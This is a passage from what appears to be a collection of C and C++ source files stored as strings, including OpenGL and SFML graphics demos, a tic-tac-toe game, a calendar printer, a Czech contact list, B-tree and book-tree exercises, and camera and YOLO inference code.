clock.getElapsedTime().asSeconds();\n\n            // Clear views\n            SFMLView1.clear();\n            SFMLView2.clear();\n\n            // Draw sprite 1 on view 1\n            sprite1.setRotation(time * 100);\n            SFMLView1.draw(sprite1);\n\n            // Draw sprite 2 on view 2\n            sprite2.setPosition(std::cos(time) * 100.f, 0.f);\n            SFMLView2.draw(sprite2);\n\n            // Display each view on screen\n            SFMLView1.display();\n            SFMLView2.display();\n        }\n    }\n\n    // Close our SFML views before destroying the underlying window\n    SFMLView1.close();\n    SFMLView2.close();\n\n    // Destroy the main window (all its child controls will be destroyed)\n    DestroyWindow(window);\n\n    // Don't forget to unregister the window class\n    UnregisterClass(TEXT(\"SFML App\"), instance);\n\n    return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\n#include<GL/glut.h>\nusing namespace std;\nint w = 600;\nint h = 400;\n\n// *************Function Decleartion**************\n\tvoid coordinate();\n\tvoid myInit();\n\tvoid MyDisplay();\n\tvoid bresenhamCircle(int x,int y,int r);\n\n// **************MAIN FUNCTION************************\nint main(int a,char **v) {\n\tglutInit(&a,v);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowPosition(0,0);\n\tglutInitWindowSize(h,w);\n\tglutCreateWindow(\"Bresenham Circle\");\n\tmyInit();\n\tglutDisplayFunc(MyDisplay);\n\tglutMainLoop();\n\treturn 0;\n}\n\n// ***************** Myinit ********************\nvoid myInit() {\n\tglPointSize(5.0);\n\tglClearColor(1.0,1.0,1.0,0);\n\tglColor3f(0.0,0.0,0.0);\n\tgluOrtho2D(-w/2,w/2,-h/2,h/2);\n}\n\nvoid coordinate() {\n\tglBegin(GL_LINES);\n\t\tglVertex2d(-w/2,0);\n\t\tglVertex2d(w/2,0);\n\t\tglVertex2d(0,-h/2);\n\t\tglVertex2d(0,h/2);\n\tglEnd();\n\tglFlush();\n}\n\nvoid MyDisplay() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tcoordinate();\n\tbresenhamCircle(0,0,100);\n\tglFlush();\n}\n\nvoid bresenhamCircle(int x,int y,int r) {\n\tint xi = 0;\n\tint yi = r;\n\tint pk = 3-2*r;\n\tint pi = pk;\n\n\twhile(xi<=yi) {\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2f(xi,yi);\n\t\t\tglVertex2f(yi,xi);\n\t\t\tglVertex2f(yi,-xi);\n\t\t\tglVertex2f(xi,-yi);\n\t\t\tglVertex2f(-xi,-yi);\n\t\t\tglVertex2f(-yi,-xi);\n\t\t\tglVertex2f(-yi,xi);\n\t\t\tglVertex2f(-xi,yi);\n\n\t\tglEnd();\n\t\tglFlush();\n\n\t\tif(pi<0) {\n\t\t\txi = xi+1;\n\t\t\tyi = yi;\n\t\t\tpi = pi+4*xi+6;\n\t\t}\n\t\telse {\n\t\t\txi = xi+1;\n\t\t\tyi = yi-1;\n\t\t\tpi = pi+4*(xi-yi)+10;\n\t\t}\n\t}\n\n}\n",
    "// Tic Tac Toe Game\r\n\r\n// Author : The_mantux(C)\r\n// Date : 03-05-2024\r\n// github : https://github.com/The-mantux\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n\r\nusing namespace std;\r\n\r\n// Colors\r\n#define RESET       \"\\033[0m\"\r\n#define BLUE        \"\\033[1m\\033[34m\"  /*Player0*/\r\n#define RED         \"\\033[1m\\033[31m\"  /*Player1*/\r\n#define YELLOW      \"\\033[1m\\033[33m\"  /*beware error*/\r\n#define GREEN       \"\\033[1m\\033[32m\"  /*Winner*/\r\n\r\n// Prototypes\r\nint  menu();\r\nvoid printTutorialTable0();\r\nvoid printTutorialTable1();\r\nvoid gameTable(char table[3][3]);\r\nint  game(char table[3][3],int x);\r\nvoid tablePrint(char table[3][3]);\r\nint  player0(char table[3][3],int vet[],int &counter);\r\nint  checker(int cell[],int number);\r\nvoid selectCell(int &row,int &col,int number);\r\nvoid next();\r\n\r\nint main(){\r\n\r\n    int s,x,counter=0,row,col;\r\n\r\n    char table[3][3]={\r\n        {'1','2','3'},\r\n        {'4','5','6'},\r\n        {'7','8','9'}\r\n    };\r\n\r\n    int cell[3*3];\r\n\r\n    do{\r\n        system(\"cls\");\r\n        s=menu();\r\n\r\n        switch(s){\r\n\r\n            case 1:{\r\n                //Game\r\n\r\n                x=rand() % 2 + 1;\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n                //Tutorial\r\n\r\n                cout<<\"\\nPlayer 1 : \"<<BLUE<<\"X\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<<\"O\"<<RESET<<endl;\r\n\r\n                cout<<\"\\n\";\r\n\r\n                cout<<\"At the beginning of the game you will be randomly chosen which player will start the game...\"<<endl;\r\n\r\n                next();\r\n                cin.get();\r\n\r\n                cout<<\"This is the game table: \\n\";\r\n                printTutorialTable0();\r\n                cout<<\"\\nSelect the cell number you want to select...\"<<endl;\r\n\r\n                next();\r\n\r\n                cout<<\"At the end of the game the result will be such a thing: \"<<endl;\r\n                printTutorialTable1();\r\n\r\n                next();\r\n\r\n                cout<<\"Keep track of your victories and defeats...\"<<endl;\r\n                cout<<\"Game\"<<endl;\r\n                cout<<\"Player 1 : \"<<BLUE<< 15<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<< 11<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Draws : \"<<2<<endl;\r\n\r\n                cout<<\"\\n\\nNow it's time to play\";\r\n\r\n                next();\r\n\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                //Exit\r\n                cout<<BLUE<<\"Bye\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            default:{\r\n                //Error\r\n                cout<<RED<<\"Error\"<<RESET<<endl;\r\n                break;\r\n            }\r\n        }\r\n\r\n    }while(s!=0);\r\n\r\n    return 0;\r\n}\r\n\r\nint game(char table[3][3],int x){\r\n    \r\n    if(x==1){\r\n        //Player 0\r\n        cout<<\"Player 1 starts the game\"<<endl;\r\n    }\r\n    else if(x==2){\r\n        cout<<\"Player 2 starts the game\"<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid tablePrint(char table[3][3]){\r\n\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[0][0]<<\"  |  \"<<table[0][1]<<\"  |  \"<<table[0][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[1][0]<<\"  |  \"<<table[1][1]<<\"  |  \"<<table[1][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[2][0]<<\"  |  \"<<table[2][1]<<\"  |  \"<<table[2][2]<<\"  \"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n}\r\n\r\nint player0(char table[3][3],int vet[],int &counter){\r\n    //Player 1\r\n\r\n    int cell,c=0,c1=0;\r\n\r\n    void tablePrint(char table[3][3]);\r\n\r\n    do{\r\n\r\n        cout<<\"Select the cell number you want to select...\"<<endl;\r\n        cin>>cell;\r\n\r\n        if(cell<1 || cell>9){\r\n            cout<<RED<<\"Insert an existing cell\"<<RESET<<endl;\r\n            c=-1;\r\n        }\r\n\r\n        c1=checker(vet,cell);\r\n        \r\n        if(c1==-1){\r\n            cout<<RED<<\"The cell is already occupied\\n\";\r\n        }\r\n\r\n\r\n    }while(c==-1 || c1==-1);\r\n\r\n    vet[counter]=cell;\r\n    counter++;\r\n\r\n    return cell;\r\n}\r\n\r\nvoid selectCell(int &row,int &col,int number){\r\n\r\n    if(number==1){\r\n        row=0;\r\n        col=0;\r\n    }\r\n    else if(number==2){\r\n        row=0;\r\n        col=1;\r\n    }\r\n    else if(number==3){\r\n        row=0;\r\n        col=2;\r\n    }\r\n    else if(number==4){\r\n        row=1;\r\n        col=0;\r\n    }\r\n    else if(number==5){\r\n        row=1;\r\n        col=1;\r\n    }\r\n    else if(number==6){\r\n        row=1;\r\n        col=2;\r\n    }\r\n    else if(number==7){\r\n        row=2;\r\n        col=0;\r\n    }\r\n    else if(number==8){\r\n        row=2;\r\n        col=1;\r\n    }\r\n    else if(number==9){\r\n        row=2;\r\n        col=2;\r\n    }\r\n}\r\n\r\nint checker(int cell[],int number){\r\n\r\n    bool check=false;\r\n\r\n    for(int i=0;i<sizeof(cell);i++){\r\n\r\n        if(cell[i]==number){\r\n            check=true;\r\n        }\r\n    }\r\n\r\n    if(check==true){\r\n        return -1;\r\n    }\r\n    else{\r\n        return 0;\r\n    }\r\n}\r\n\r\nvoid printTutorialTable0(){\r\n",
    "#include <iostream>\n#include <iomanip>\n\nint main() {\n    int year, month;\n\n    std::cout << \"Enter year: \";\n    std::cin >> year;\n\n    std::cout << \"Enter month (1-12): \";\n    std::cin >> month;\n\n    int daysInMonth;\n    if (month == 2) {\n        if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n            daysInMonth = 29;\n        } else {\n            daysInMonth = 28;\n        }\n    } else if (month == 4 || month == 6 || month == 9 || month == 11) {\n        daysInMonth = 30;\n    } else {\n        daysInMonth = 31;\n    }\n\n    int startDay = (year - 1) * 365 + (year - 1) / 4 - (year - 1) / 100 + (year - 1) / 400;\n    for (int i = 1; i < month; i++) {\n        if (i == 2) {\n            if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0)) {\n                startDay += 29;\n            } else {\n                startDay += 28;\n            }\n        } else if (i == 4 || i == 6 || i == 9 || i == 11) {\n            startDay += 30;\n        } else {\n            startDay += 31;\n        }\n    }\n    startDay %= 7;\n\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \"        \" << std::setw(4) << year << \"         \" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n    std::cout << \" Sun Mon Tue Wed Thu Fri Sat\" << std::endl;\n    std::cout << \"---------------------------\" << std::endl;\n\n    for (int i = 0; i < startDay; i++) {\n        std::cout << \"    \";\n    }\n\n    for (int day = 1; day <= daysInMonth; day++) {\n        std::cout << std::setw(4) << day;\n\n        if ((startDay + day) % 7 == 0) {\n            std::cout << std::endl;\n        }\n    }\n\n    std::cout << std::endl << \"---------------------------\" << std::endl;\n\n    return 0;\n}",
    "#include <openpose/producer/flirReader.hpp>\n#include <openpose/utilities/fastMath.hpp>\n#include <openpose/utilities/string.hpp>\n#include <openpose_private/utilities/openCvMultiversionHeaders.hpp>\n\nnamespace op\n{\n    FlirReader::FlirReader(const std::string& cameraParameterPath, const Point<int>& cameraResolution,\n                           const bool undistortImage, const int cameraIndex) :\n        Producer{ProducerType::FlirCamera, cameraParameterPath, undistortImage, -1},\n        mSpinnakerWrapper{cameraParameterPath, cameraResolution, undistortImage, cameraIndex},\n        mFrameNameCounter{0ull}\n    {\n        try\n        {\n            // Get resolution\n            const auto resolution = mSpinnakerWrapper.getResolution();\n            // Set resolution\n            set(CV_CAP_PROP_FRAME_WIDTH, resolution.x);\n            set(CV_CAP_PROP_FRAME_HEIGHT, resolution.y);\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n        }\n    }\n\n    FlirReader::~FlirReader()\n    {\n        try\n        {\n            release();\n        }\n        catch (const std::exception& e)\n        {\n            errorDestructor(e.what(), __LINE__, __FUNCTION__, __FILE__);\n        }\n    }\n\n    std::vector<Matrix> FlirReader::getCameraMatrices()\n    {\n        try\n        {\n            return mSpinnakerWrapper.getCameraMatrices();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    std::vector<Matrix> FlirReader::getCameraExtrinsics()\n    {\n        try\n        {\n            return mSpinnakerWrapper.getCameraExtrinsics();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    std::vector<Matrix> FlirReader::getCameraIntrinsics()\n    {\n        try\n        {\n            return mSpinnakerWrapper.getCameraIntrinsics();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    std::string FlirReader::getNextFrameName()\n    {\n        try\n        {\n            const auto stringLength = 12u;\n            return toFixedLengthString(mFrameNameCounter, stringLength);\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return \"\";\n        }\n    }\n\n    bool FlirReader::isOpened() const\n    {\n        try\n        {\n            return mSpinnakerWrapper.isOpened();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return false;\n        }\n    }\n\n    void FlirReader::release()\n    {\n        try\n        {\n            mSpinnakerWrapper.release();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n        }\n    }\n\n    Matrix FlirReader::getRawFrame()\n    {\n        try\n        {\n            return mSpinnakerWrapper.getRawFrames().at(0);\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return Matrix();\n        }\n    }\n\n    std::vector<Matrix> FlirReader::getRawFrames()\n    {\n        try\n        {\n            mFrameNameCounter++; // Simple counter: 0,1,2,3,...\n            return mSpinnakerWrapper.getRawFrames();\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return {};\n        }\n    }\n\n    double FlirReader::get(const int capProperty)\n    {\n        try\n        {\n            if (capProperty == CV_CAP_PROP_FRAME_WIDTH)\n            {\n                if (Producer::get(ProducerProperty::Rotation) == 0.\n                    || Producer::get(ProducerProperty::Rotation) == 180.)\n                    return mResolution.x;\n                else\n                    return mResolution.y;\n            }\n            else if (capProperty == CV_CAP_PROP_FRAME_HEIGHT)\n            {\n                if (Producer::get(ProducerProperty::Rotation) == 0.\n                    || Producer::get(ProducerProperty::Rotation) == 180.)\n                    return mResolution.y;\n                else\n                    return mResolution.x;\n            }\n            else if (capProperty == CV_CAP_PROP_POS_FRAMES)\n                return (double)mFrameNameCounter;\n            else if (capProperty == CV_CAP_PROP_FRAME_COUNT)\n                return -1.;\n            else if (capProperty == CV_CAP_PROP_FPS)\n                return -1.;\n            else\n            {\n                opLog(\"Unknown property.\", Priority::Max, __LINE__, __FUNCTION__, __FILE__);\n                return -1.;\n            }\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION_",
    "#include <iostream>\r\n#include <string>\r\n#include <algorithm>\r\n#include <cctype>\r\n\r\nusing namespace std;\r\n\r\n\tclass kontakt{\r\n\t\r\n\t\tprivate:\r\n\t\t\r\n\t\t\tint telCislo;\r\n\t\t\tstring jmeno;\r\n\t\t\tstring prijmeni;\r\n\t\t\tstring povolani;\r\n\t\t\tstring firma;\r\n\t\t\tstring email;\r\n\t\t\tint vek;\r\n\t\t\tstring datumNarozeni;\r\n\t\t\r\n\t\tpublic:\r\n\t\t\r\n\t\t\tkontakt(int telCislo, string jmeno, string prijmeni, string povolani, string firma, string email, int vek, string datumNarozeni){\r\n\t\t\t\tthis->telCislo = telCislo;\r\n\t\t\t\tthis->jmeno = jmeno;\r\n\t\t\t\tthis->prijmeni = prijmeni;\r\n\t\t\t\tthis->povolani = povolani;\r\n\t\t\t\tthis->firma = firma;\r\n\t\t\t\tthis->email = email;\r\n\t\t\t\tthis->vek = vek;\r\n\t\t\t\tthis->datumNarozeni = datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getTelCislo(int telCislo){\r\n\t\t\t\treturn telCislo;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getJmeno(string jmeno){\r\n\t\t\t\treturn jmeno;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPrijmeni(string prijmeni){\r\n\t\t\t\treturn prijmeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getPovolani(string povolani){\r\n\t\t\t\treturn povolani;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getFirma(string firma){\r\n\t\t\t\treturn firma;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getEmail(string email){\r\n\t\t\t\treturn email;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tint getVek(int vek){\r\n\t\t\t\treturn vek;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tstring getDatumNarozeni(string datumNarozeni){\r\n\t\t\t\treturn datumNarozeni;\r\n\t\t\t}\r\n\t\t\r\n\t\t\tvoid vypsat(){\r\n\t\t\t\tcout << \"Jmeno a prijmeni: \" << getJmeno(jmeno) << \" \" << getPrijmeni(prijmeni) << endl;\r\n\t\t\t\tcout << \"Telefonni cislo: \" << getTelCislo(telCislo) << endl;\r\n\t\t\t\tcout << \"Povolani: \" << getPovolani(povolani) << endl;\r\n\t\t\t\tcout << \"Firma: \" << getFirma(firma) << endl;\r\n\t\t\t\tcout << \"Email: \" << getEmail(email) << endl;\r\n\t\t\t\tcout << \"Vek: \" << getVek(vek) << endl;\r\n\t\t\t\tcout << \"Datum narozeni: \" << getDatumNarozeni(datumNarozeni) << endl;\r\n\t\t\t}\t\r\n\t\t\r\n\t};\r\n\r\n\tchar ToUpper(char cyklus){\r\n\t\treturn std::toupper(static_cast<unsigned char>(cyklus));\r\n\t}\r\n\r\nint main(int argc, char *argv[]){\r\n\t\r\n\tint vyber;\r\n\tchar cyklus;\r\n\t\r\n\tkontakt Pavel(789225103, \"Pavel\", \"Novak\", \"Elektrikar\", \"LCD Labs\", \"pnovak@lcd.cz\", 39, \"15. leden 1985\");\r\n\tkontakt Adam(608995422, \"Adam\", \"Novotny\", \"Programator\", \"Microsoft\", \"adamdeveloper@microsoft.com\", 26, \"10. brezen 1998\");\r\n\tkontakt Josef(991238250, \"Josef\", \"Dvorak\", \"Duchodce\", \"N/A\", \"N/A\", 91, \"29. unor 1933\");\r\n\tkontakt Klara(775148952, \"Klara\", \"Svobodova\", \"Student\", \"SSIPF Cichnova\", \"st011862@student.cichnovabrno.cz\", 17, \"7. duben 2007\");\r\n\t\r\n\tdo{\r\n\t\tcout << \"Seznam telefonnich kontaktu\" << endl;\r\n\t\tcout << \"1. Pavel\" << endl;\r\n\t\tcout << \"2. Adam\" << endl;\r\n\t\tcout << \"3. Josef\" << endl;\r\n\t\tcout << \"4. Klara\" << endl;\r\n\t\tcout << \"Vyber kontakt: \";\r\n\t\tcin >> vyber;\r\n\t\r\n\t\tsystem(\"cls\");\r\n\t\r\n\t\t\tswitch(vyber){\r\n\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\t\r\n\t\t\t\t\tPavel.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\t\r\n\t\t\t\t\tAdam.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\t\r\n\t\t\t\t\tJosef.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tcase 4:\r\n\t\t\t\t\t\r\n\t\t\t\t\tKlara.vypsat();\r\n\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\r\n\t\t\t\tdefault:\r\n\t\t\t\t\t\r\n\t\t\t\t\tcout << \"Neplatna odpoved.\" << endl;\r\n\t\t\t\t\treturn 0;\r\n\t\t\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\r\n\t\t\t}\r\n\t\r\n\tcout << \"Prejete si program pouzit znovu? (y/Y): \";\r\n\tcin >> cyklus;\r\n\t\r\n\tchar upperCyklus = std::toupper(cyklus);\r\n\t\r\n\tsystem(\"cls\");\r\n\t\r\n\t}while(cyklus == 'Y' || cyklus == 'y');\r\n\t\tcout << \"Dekuji za pouziti programu. Ukoncuji.\" << endl;\r\n\t\treturn 0;\r\n}",
    "#include <stdio.h>\r\n #include <stdlib.h>\r\n #define MAX 4\r\n #define MIN 2\r\n struct btreeNode {\r\n int val[MAX + 1], count;\r\n struct btreeNode *link[MAX + 1];\r\n };\r\n struct btreeNode *root;\r\n /* creating new node */\r\n struct btreeNode * createNode(int val, struct btreeNode *child) {\r\n struct btreeNode *newNode;\r\n newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n newNode->val[1] = val;\r\n newNode->count = 1;\r\n\r\n newNode->link[0] = root;\r\n newNode->link[1] = child;\r\n return newNode;\r\n }\r\n /* Places the value in appropriate position */\r\n void addValToNode(int val, int pos, struct btreeNode *node,\r\n struct btreeNode *child) {\r\n int j = node->count;\r\n while (j > pos) {\r\n node->val[j + 1] = node->val[j];\r\n node->link[j + 1] = node->link[j];\r\n j--;\r\n }\r\n node->val[j + 1] = val;\r\n node->link[j + 1] = child;\r\n node->count++;\r\n }\r\n /* split the node */\r\n void splitNode (int val, int *pval, int pos, struct btreeNode *node,\r\n struct btreeNode *child, struct btreeNode **newNode) {\r\n int median, j;\r\n if (pos > MIN)\r\n median = MIN + 1;\r\n else\r\n median = MIN;\r\n *newNode = (struct btreeNode *)malloc(sizeof(struct btreeNode));\r\n j = median + 1;\r\n while (j <= MAX) {\r\n (*newNode)->val[j - median] = node->val[j];\r\n (*newNode)->link[j - median] = node->link[j];\r\n\r\n j++;\r\n }\r\n node->count = median;\r\n (*newNode)->count = MAX - median;\r\n if (pos <= MIN) {\r\n addValToNode(val, pos, node, child);\r\n } else {\r\n addValToNode(val, pos - median, *newNode, child);\r\n }\r\n *pval = node->val[node->count];\r\n (*newNode)->link[0] = node->link[node->count];\r\n node->count--;\r\n }\r\n /* sets the value val in the node */\r\n int setValueInNode(int val, int *pval,\r\n struct btreeNode *node, struct btreeNode **child) {\r\n int pos;\r\n if (!node) {\r\n *pval = val;\r\n *child = NULL;\r\n return 1;\r\n }\r\n if (val < node->val[1]) {\r\n pos = 0;\r\n } else {\r\n for (pos = node->count;\r\n (val < node->val[pos] && pos > 1); pos--);\r\n if (val == node->val[pos]) {\r\n printf(\"Duplicates not allowed\\n\");\r\n return 0;\r\n\r\n }\r\n }\r\n if (setValueInNode(val, pval, node->link[pos], child)) {\r\n if (node->count < MAX) {\r\n addValToNode(*pval, pos, node, *child);\r\n } else {\r\n splitNode(*pval, pval, pos, node, *child, child);\r\n return 1;\r\n }\r\n }\r\n return 0;\r\n }\r\n /* insert val in B-Tree */\r\n void insertion(int val) {\r\n int flag, i;\r\n struct btreeNode *child;\r\n flag = setValueInNode(val, &i, root, &child);\r\n if (flag)\r\n root = createNode(i, child);\r\n }\r\n /* copy successor for the value to be deleted */\r\n void copySuccessor(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *dummy;\r\n dummy = myNode->link[pos];\r\n for (;dummy->link[0] != NULL;)\r\n dummy = dummy->link[0];\r\n myNode->val[pos] = dummy->val[1];\r\n }\r\n /* removes the value from the given node and rearrange values */\r\n\r\n void removeVal(struct btreeNode *myNode, int pos) {\r\n int i = pos + 1;\r\n while (i <= myNode->count) {\r\n myNode->val[i - 1] = myNode->val[i];\r\n myNode->link[i - 1] = myNode->link[i];\r\n i++;\r\n }\r\n myNode->count--;\r\n }\r\n /* shifts value from parent to right child */\r\n void doRightShift(struct btreeNode *myNode, int pos) {\r\n struct btreeNode *x = myNode->link[pos];\r\n int j = x->count;\r\n while (j > 0) {\r\n x->val[j + 1] = x->val[j];\r\n x->link[j + 1] = x->link[j];\r\n }\r\n x->val[1] = myNode->val[pos];\r\n x->link[1] = x->link[0];\r\n x->count++;\r\n x = myNode->link[pos - 1];\r\n myNode->val[pos] = x->val[x->count];\r\n myNode->link[pos] = x->link[x->count];\r\n x->count--;\r\n return;\r\n }\r\n /* shifts value from parent to left child */\r\n void doLeftShift(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x = myNode->link[pos - 1];\r\n\r\n x->count++;\r\n x->val[x->count] = myNode->val[pos];\r\n x->link[x->count] = myNode->link[pos]->link[0];\r\n x = myNode->link[pos];\r\n myNode->val[pos] = x->val[1];\r\n x->link[0] = x->link[1];\r\n x->count--;\r\n while (j <= x->count) {\r\n x->val[j] = x->val[j + 1];\r\n x->link[j] = x->link[j + 1];\r\n j++;\r\n }\r\n return;\r\n }\r\n /* merge nodes */\r\n void mergeNodes(struct btreeNode *myNode, int pos) {\r\n int j = 1;\r\n struct btreeNode *x1 = myNode->link[pos], *x2 = myNode->link[pos - 1];\r\n x2->count++;\r\n x2->val[x2->count] = myNode->val[pos];\r\n x2->link[x2->count] = myNode->link[0];\r\n while (j <= x1->count) {\r\n x2->count++;\r\n x2->val[x2->count] = x1->val[j];\r\n x2->link[x2->count] = x1->link[j];\r\n j++;\r\n }\r\n j = pos;\r\n while (j < myNode->count) {\r\n myNode->val[j] = myNode->val[j + 1];\r\n\r\n myNode->link[j] = myNode->link[j + 1];\r\n j++;\r\n }\r\n myNode->count--;\r\n free(x1);\r\n }\r\n /* adjusts the given node */\r\n void adjustNode(struct btreeNode *myNode, int pos) {\r\n if (!pos) {\r\n if (myNode->link[1]->count > MIN) {\r\n doLeftShift(myNode, 1);\r\n } else {\r\n mergeNodes(myNode, 1);\r\n }\r\n } else {\r\n if (myNode->count != pos) {\r\n if(myNode->link[pos - 1]->count > MIN) {\r\n doRightShift(myNode, pos);\r\n } else {\r\n if (myNode->link[pos + 1]->count > MIN) {\r\n doLeftShift(myNode, pos + 1);\r\n } else {\r\n mergeNodes(myNode, pos);\r\n }\r\n }\r\n } else {\r\n if (myNode->link[pos - 1]->count > MIN)\r\n doRightShift(myNode, pos);\r\n else\r\n mer",
    "/* \nA book consists of chapters, chapters consist of sections and sections consist of subsections. Construct a tree and print the nodes. \nFind the time and space requirements of your method.  */\n\n#include <iostream>\n#include <cstdlib>\n#include <string.h>\n\nusing namespace std;\n\nstruct node\n{\n    char label[10];\n    int ch_count;\n    struct node *child[10];\n} *root;\n\nclass GT\n{\npublic:\n    void create_tree();\n    void display(node *r1);\n    GT()\n    {\n        root = NULL;\n    }\n};\n\nvoid GT::create_tree()\n{\n    int tbooks, tchapters, i, j, k;\n    root = new node;\n    cout << \"Enter name of book: \";\n    cin >> root->label;\n    cout << \"Enter no. of chapters in book: \";\n    cin >> tchapters;\n    root->ch_count = tchapters;\n\n    for (i = 0; i < tchapters; i++)\n    {\n        root->child[i] = new node;\n        cout << \"Enter Chapter name: \";\n        cin >> root->child[i]->label;\n        cout << \"Enter no. of sections in Chapter \" << root->child[i]->label << \": \";\n        cin >> root->child[i]->ch_count;\n\n        for (j = 0; j < root->child[i]->ch_count; j++)\n        {\n            root->child[i]->child[j] = new node;\n            cout << \"Enter Section \" << j + 1 << \" name: \";\n            cin >> root->child[i]->child[j]->label;\n        }\n    }\n}\n\nvoid GT::display(node *r1)\n{\n    int i, j, k, tchapters;\n    if (r1 != NULL)\n    {\n        cout << \"\\n-----Book Hierarchy---\";\n        cout << \"\\n Book title: \" << r1->label;\n        tchapters = r1->ch_count;\n\n        for (i = 0; i < tchapters; i++)\n        {\n            cout << \"\\n Chapter \" << i + 1;\n            cout << \" \" << r1->child[i]->label;\n            cout << \"\\n Sections\";\n\n            for (j = 0; j < r1->child[i]->ch_count; j++)\n            {\n                cout << \"\\n \" << r1->child[i]->child[j]->label;\n            }\n        }\n    }\n}\n\nint main()\n{\n    int choice;\n    GT gt;\n\n    while (1)\n    {\n        cout << \"\\nBook Tree Creation\" << endl;\n        cout << \"\\n1. Create\" << endl;\n        cout << \"2. Display\" << endl;\n        cout << \"3. Quit\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice)\n        {\n        case 1:\n            gt.create_tree();\n            break;\n        case 2:\n            gt.display(root);\n            break;\n        case 3:\n            exit(1);\n        default:\n            cout << \"Wrong choice\" << endl;\n        }\n    }\n    return 0;\n}\n",
    "#include \"yolo.h\"\n\nyolo::YOLO::YOLO(const utils::InitParameter &param) : m_param(param) {\n  // input\n  m_input_src_device = nullptr;\n  m_input_resize_device = nullptr;\n  m_input_rgb_device = nullptr;\n  m_input_norm_device = nullptr;\n  m_input_hwc_device = nullptr;\n  CHECK(cudaMalloc(&m_input_src_device, param.batch_size * 3 * param.src_h *\n                                            param.src_w *\n                                            sizeof(unsigned char)));\n  CHECK(cudaMalloc(&m_input_resize_device, param.batch_size * 3 * param.dst_h *\n                                               param.dst_w * sizeof(float)));\n  CHECK(cudaMalloc(&m_input_rgb_device, param.batch_size * 3 * param.dst_h *\n                                            param.dst_w * sizeof(float)));\n  CHECK(cudaMalloc(&m_input_norm_device, param.batch_size * 3 * param.dst_h *\n                                             param.dst_w * sizeof(float)));\n  CHECK(cudaMalloc(&m_input_hwc_device, param.batch_size * 3 * param.dst_h *\n                                            param.dst_w * sizeof(float)));\n\n  // output\n  m_output_src_device = nullptr;\n  m_output_objects_device = nullptr;\n  m_output_objects_host = nullptr;\n  m_output_objects_width = 7;\n  m_output_idx_device = nullptr;\n  m_output_conf_device = nullptr;\n  int output_objects_size =\n      param.batch_size * (1 + param.topK * m_output_objects_width); // 1: count\n  CHECK(cudaMalloc(&m_output_objects_device,\n                   output_objects_size * sizeof(float)));\n  CHECK(cudaMalloc(&m_output_idx_device,\n                   m_param.batch_size * m_param.topK * sizeof(int)));\n  CHECK(cudaMalloc(&m_output_conf_device,\n                   m_param.batch_size * m_param.topK * sizeof(float)));\n  m_output_objects_host = new float[output_objects_size];\n  m_objectss.resize(param.batch_size);\n}\n\nyolo::YOLO::~YOLO() {\n  // input\n  